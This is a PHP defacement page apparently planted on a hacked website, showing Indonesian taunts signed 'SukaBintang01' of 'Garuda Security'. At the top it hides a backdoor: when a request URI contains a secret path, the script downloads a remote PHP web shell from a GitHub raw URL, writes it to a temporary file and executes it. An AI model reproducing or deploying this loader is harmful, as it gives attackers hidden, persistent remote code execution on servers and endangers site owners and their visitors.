<?php
if (strpos($_SERVER['REQUEST_URI'], '/SukaBintang01') !== false) {
    $url = 'https://raw.githubusercontent.com/Tituss22/ShellSukaBintang01/refs/heads/main/original.php';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $code = curl_exec($ch);
    curl_close($ch);

    if ($code !== false) {
        $tmp_file = tempnam(sys_get_temp_dir(), 'php');
        file_put_contents($tmp_file, $code);
        include $tmp_file;
        unlink($tmp_file);
    } else {
        echo "Gagal mengambil script dari GitHub.";
    }

    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacked By SukaBintang01</title>
    <link rel="icon" href="https://telegra.ph/file/a35b090cf9ec01898604c.jpg" type="image/x-icon">
    <meta name="description" content="Hacked By SukaBintang01">
    <meta name="keywords" content="Hacked By SukaBintang01">
    <meta name="rating" content="General">
    <meta name="revisit-after" content="1 days">
    <meta name="classification" content="Hacked By SukaBintang01">
    <meta name="robots schedule" content="auto">
    <meta name="google-site-verification" content="45v2vK6HFoU0gBd7Xg8hVDZgi5Jr84CyMnmBqj8PcoA" />
    <link href="https://fonts.googleapis.com/css2?family=Oxygen" rel="stylesheet">
</head>
<body>
<style>
html {
    background-color: black;
    color: #000;
}
h2 {
    font-family:"Bold 700 Italic",Mali;
    color:red;
}
h3, h4 {
    font-family:"Oxygen",serif;
    color:white;
}
a {
    color: white;
    text-decoration: none;
}
::selection {
    color:white;
    background:#000;
}
</style>
<script src="script.js"></script>
<table width="100%" height="100%">
    <td align="center">
        <img alt="#FuckBnPp" src="https://telegra.ph/file/f8e5b2de33ddaa512ccf7.jpg" width="450px">
        <h2>Hacked By SukaBintang01</h2>        <h4><br> //---------------------------Garuda Security---------------------------//<br>
            <br>"Website lo gampang banget dicolong, sekelas bocah warnet aja bisa masuk. Ga usah sok-sokan online kalo sekuriti kayak kardus bekas. Ini web, bukan kandang ayam. Kalo ngurusnya males, ya beginilah hasilnya. Belajar ngelock pintu sebelum pamer rumah di pinggir jalan."</br>
        <br> //---------------------------Garuda Security---------------------------//<br><br>
      <br>#BelajarParameterDulu #TimItSupportLemmer #CodeOpenSource
        <br><br>Server Sampah!!!</br></h4>
        <audio controls="controls" src="https://fajarcode.com/uploads/sound.mp3"></audio>
        <h3> <a href="https://t.me/garudasecurityofficial" >- <font color="red">Official team</font> -<br>  SukaJanda01 - WhiteRose - Awan - saint - Crishbit - Cyber jawa timur - SukaBintang01 - ./FqXploit - Tn_wizyakuza 404</h3>
</body>
</html>
